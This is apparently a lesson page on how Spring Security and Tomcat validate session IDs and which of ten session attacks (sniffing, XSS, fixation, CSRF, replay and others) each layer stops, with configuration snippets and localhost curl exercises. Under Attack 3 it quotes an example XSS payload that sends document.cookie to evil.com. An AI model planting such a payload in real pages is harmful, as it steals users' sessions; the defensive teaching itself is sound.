



## The problem it solves

The session ID is a bearer ticket: whoever holds it is treated as the user. There is no password check on later requests, only the ticket. So you need to know two things:

1. **How does the server decide a ticket is real?**
2. **What can attackers do to get or abuse one, and who stops them?**

Spring Security stops many of these attacks, but not all of them. I'll say clearly which are which.

---

## Part 1: How the server decides an ID is valid

### Validation is a lookup, not a calculation

A session ID has no signature, no hidden data, and no math you can verify. It is just a key in a map. The server decides it is valid with three questions:

|Question|Who asks it|If the answer is no|
|---|---|---|
|Does this ID exist in my session map?|Tomcat|Treated as having no session|
|Has it expired? (idle time greater than max inactive interval)|Tomcat|Session removed, treated as no session|
|Does the session contain a login (`SecurityContext`)?|Spring Security|Treated as anonymous, so protected URLs are denied|

An ID is "valid" only because **the server remembers it**. If you invent one, it isn't in the map, so it fails.

### The request path, step by step

```
Cookie: JSESSIONID=7F3A...
        │
        ▼
Tomcat: map.get("7F3A...")
   ├─ not found / expired → request has NO session
   └─ found → attach session, reset idle timer
        │
        ▼
Spring Security filter: SecurityContextHolderFilter
   └─ asks HttpSessionSecurityContextRepository:
      "does this session hold SPRING_SECURITY_CONTEXT?"
        ├─ yes → put the Authentication (alice, ROLE_USER) on this thread
        └─ no  → continue as anonymous
        │
        ▼
AnonymousAuthenticationFilter → AuthorizationFilter → your controller
```

Walking through it:

- **Tomcat** does the lookup first, before any of your code. A forged or expired ID is silently ignored, not treated as an error.
- **`HttpSessionSecurityContextRepository`** is the class that reads your login out of the session. Your identity lives under the attribute name `SPRING_SECURITY_CONTEXT`.
- The **`SecurityContextHolder`** then keeps the user on the current thread, so `@AuthenticationPrincipal` and `hasRole(...)` work.
- If there's no login in the session, the **`AnonymousAuthenticationFilter`** gives the request an "anonymous" identity. The **`AuthorizationFilter`** then rejects it if the URL requires login.

Notice what is not checked: where the request came from, or whether it's really Alice's browser. **A valid ID is accepted from anyone who presents it.** That fact is the root of most attacks below.

---

## Part 2: The attacks, one at a time

### Attack 1: Guessing the ID (brute force)

**The idea:** try random IDs until one matches a live session.

**Why it fails:** the ID is 128 bits from `SecureRandom`, so there are about 3.4 × 10³⁸ possibilities. With 10 million live sessions, a guess succeeds with a probability near 3 × 10⁻³².

**Who defends:** Tomcat's generator, not Spring Security. You defend it by _never_ inventing your own IDs (don't use user ids or timestamps as session values).

### Attack 2: Sniffing the ID on the network

**The idea:** on public Wi-Fi, an attacker reads your plain-HTTP traffic, sees `Cookie: JSESSIONID=...`, and copies it. This is what **Firesheep** did in 2010.

**Defenses:**

|Layer|Defense|
|---|---|
|Your server|HTTPS everywhere (`server.ssl.*` or a proxy)|
|Cookie|`Secure` flag, so the browser never sends it over HTTP|
|Browser|**HSTS**, so the browser never even tries HTTP|

**Spring Security's part:** it sends the HSTS header by default on HTTPS requests, and `http.requiresChannel(c -> c.anyRequest().requiresSecure())` redirects HTTP to HTTPS. You must set the `Secure` flag via properties yourself:

```properties
server.servlet.session.cookie.secure=true
```

### Attack 3: Stealing the ID with XSS

**The idea:** the attacker injects a script into your page (`<script>fetch('//evil.com?c='+document.cookie)</script>`) and reads the cookie.

**Defenses:**

- **`HttpOnly`** makes `document.cookie` skip the session cookie, so the script can't read it.
- Output encoding and a CSP stop the script from running in the first place.

```properties
server.servlet.session.cookie.http-only=true
```

**Spring Security's part:** it does not fix XSS in your pages. That is your job (`th:text`, sanitizing). It supports the safety net by letting you add a CSP header. Also remember that even with `HttpOnly`, an XSS script can still **send requests as the user**, so it can do damage without ever seeing the ID.

### Attack 4: Session fixation

**The idea:** instead of stealing your ID, the attacker **gives you theirs**.

```
1. Attacker visits the site → gets session ID  X1  (not logged in)
2. Attacker tricks you into using X1 (crafted link, or planted cookie)
3. You log in  → server marks session X1 as "alice, logged in"
4. Attacker already knows X1 → they ARE Alice
```

**Why it works:** if the ID doesn't change at login, the ID the attacker knows becomes a logged-in ID.

**Spring Security's defense (on by default):** at login, it **changes the ID** while keeping the data:

```java
http.sessionManagement(s -> s
    .sessionFixation(f -> f.changeSessionId()));
```

After login, you hold `X2`. The attacker's `X1` points to nothing. Your options:

|Strategy|What it does|
|---|---|
|`changeSessionId()`|Calls the servlet method `request.changeSessionId()`. Same session, new ID. **Default.**|
|`newSession()`|Creates a fresh session and copies nothing over|
|`migrateSession()`|Creates a new session and copies the old attributes across|
|`none()`|No protection. Never use this.|

### Attack 5: ID leaking through the URL

**The idea:** if the ID travels in the URL (`/orders;jsessionid=7F3A...`), it ends up in browser history, server logs, proxy logs, and the `Referer` header sent to other sites.

**Defenses:**

```properties
server.servlet.session.tracking-modes=cookie
```

This tells Tomcat to use only cookies, never URLs.

**Spring Security's part:** its **`StrictHttpFirewall`** rejects requests whose URL contains a semicolon by default. A request like `/orders;jsessionid=...` is rejected before your controller runs, with a `RequestRejectedException`. It's a helpful second wall.

### Attack 6: CSRF (using the session without stealing it)

**The idea:** the attacker never learns the ID. They make **your browser** send a request, and the browser attaches the cookie by itself.

**Spring Security's defense:** a CSRF token required for every state-changing request (`POST`, `PUT`, `DELETE`), **on by default**, plus `SameSite=Lax` on the cookie. As we covered, the attacker's page can send the request but can't read the token.

### Attack 7: Reusing the ID after logout

**The idea:** you log out, but the server still keeps the session alive. Anyone who copied the ID earlier can keep using it.

**Spring Security's defense:** its logout handler does the real cleanup on the **server side**:

```java
http.logout(l -> l
    .logoutUrl("/logout")
    .invalidateHttpSession(true)
    .clearAuthentication(true)
    .deleteCookies("JSESSIONID"));
```

Line by line:

- `invalidateHttpSession(true)` destroys the session in Tomcat's map. This is the important one, because the coat is gone, so the ticket is worthless. (This is the default.)
- `clearAuthentication(true)` empties the SecurityContext. (Also the default.)
- `deleteCookies("JSESSIONID")` tells the browser to delete its copy. This is tidy, but it's not what actually protects you.

Logout is a `POST` and is CSRF-protected, so a hostile page can't log you out by an image tag.

### Attack 8: Using a stolen valid ID (session hijacking proper)

**The idea:** the attacker obtains a _live_ ID by malware, a leaked log, a compromised proxy, or an XSS hole you missed, then replays it from their own machine.

**The honest answer:** Spring Security **does not detect this by default**. It doesn't tie the session to an IP address or a browser fingerprint, because those change legitimately (phone moves from Wi-Fi to mobile data, corporate proxies, and so on). To the server, a valid ID is a valid user.

What you do about it:

|Defense|How it helps|
|---|---|
|Shorter idle timeout, plus an absolute timeout|Limits how long a stolen ID is useful|
|Re-ask for the password on sensitive actions (change email, payments)|A stolen ID alone isn't enough|
|`maximumSessions(1)`|A second login pushes the first out, which can alert the real user|
|Log and alert on suspicious changes (new country or device on the same session)|You can write a small filter for this|
|Passkeys / MFA at login|Reduces how often a login is compromised, though not stolen live sessions|

```java
http.sessionManagement(s -> s
    .maximumSessions(1)
    .maxSessionsPreventsLogin(false));
```

- `maximumSessions(1)` allows one active session per user.
- `maxSessionsPreventsLogin(false)` means the _new_ login wins and the _old_ session is expired. Set it to `true` to block the new login instead.

### Attack 9: Flooding the server with sessions (denial of service)

**The idea:** hit the site with millions of requests so it creates millions of sessions and runs out of memory. This is the "anonymous session trap" from the last lesson.

**Defenses:**

- Don't create sessions for anonymous traffic. Use `getSession(false)` unless you truly need a session.
- Spring Security's default `IF_REQUIRED` creates a session only when needed, and `STATELESS` never does.
- Add **rate limiting** at a gateway or filter. Spring Security doesn't include it.

### Attack 10: Concurrent or stale roles

**The idea (not an attack, more a trap):** an admin removes Alice's `ADMIN` role in the database, but her live session still holds the old `SecurityContext`, so she keeps admin rights until it expires.

**Defenses:** keep session lifetimes reasonable, and for sensitive operations re-check the database. With Spring Session, you can find and invalidate a specific user's sessions through the `FindByIndexNameSessionRepository` (it can look sessions up by username).

---

## Part 3: The big picture

|Attack|Stopped by|Who handles it|
|---|---|---|
|Guessing|128-bit `SecureRandom` IDs|Tomcat|
|Network sniffing|HTTPS, `Secure`, HSTS|You + Spring Security|
|XSS cookie theft|`HttpOnly`, encoding, CSP|You (Spring helps with headers)|
|Fixation|`changeSessionId()` at login|**Spring Security (default)**|
|URL leakage|`tracking-modes=cookie`, StrictHttpFirewall|You + Spring Security|
|CSRF|CSRF token, `SameSite`|**Spring Security (default)**|
|Reuse after logout|Server-side invalidation|**Spring Security (default)**|
|Replay of a stolen live ID|Timeouts, re-auth, monitoring|**Mostly you**|
|Session flooding|Lazy creation, rate limits|You|

Notice the pattern. Spring Security automatically handles the attacks that come from **how sessions are managed** (fixation, CSRF, logout). The attacks that come from **how the ID is carried and kept secret** (HTTPS, cookie flags, XSS) are shared work between your configuration and your code.

### A solid starting configuration

```java
@Bean
SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .authorizeHttpRequests(a -> a.anyRequest().authenticated())
        .formLogin(Customizer.withDefaults())
        .sessionManagement(s -> s
            .sessionFixation(f -> f.changeSessionId())
            .maximumSessions(1))
        .logout(l -> l
            .invalidateHttpSession(true)
            .deleteCookies("JSESSIONID"))
        .requiresChannel(c -> c.anyRequest().requiresSecure());
    return http.build();
}

@Bean
HttpSessionEventPublisher httpSessionEventPublisher() {
    return new HttpSessionEventPublisher();
}
```

```properties
server.servlet.session.timeout=20m
server.servlet.session.cookie.secure=true
server.servlet.session.cookie.http-only=true
server.servlet.session.cookie.same-site=lax
server.servlet.session.tracking-modes=cookie
```

---

## Try it yourself (on your own machine only)

**1. Prove forged IDs are ignored:**

```bash
curl -i -H "Cookie: JSESSIONID=AAAAAAAA" http://localhost:8080/me
```

You'll be redirected to login (or get a 401). The ID isn't in the map.

**2. Watch fixation protection:**  
Note your `JSESSIONID` before login (Application tab), log in, and compare. The value changes. Then temporarily set `.sessionFixation(f -> f.none())` and see it stay the same, which is exactly the hole.

**3. Prove logout kills the server session:**  
Log in, copy the cookie value, log out, then send the old value:

```bash
curl -i -H "Cookie: JSESSIONID=<old value>" http://localhost:8080/me
```

You're treated as anonymous.

**4. See the firewall at work:**

```bash
curl -i "http://localhost:8080/me;jsessionid=abc"
```

It's rejected before reaching your controller.

**5. Understand why replay works:**  
Log in, copy your cookie, and send it with `curl -H "Cookie: ..."`. The server answers as you. That is the whole reason the ID must stay secret.

---

## One related concept, briefly

**Defense in depth for sessions:** no single setting protects the ID. HTTPS protects it in transit, `HttpOnly` protects it from scripts, `SameSite` and CSRF tokens protect how the browser uses it, fixation protection protects its birth, and invalidation protects its death. Each layer covers a hole in another, and removing any one reopens an attack from the table above.





[[Spring Security]]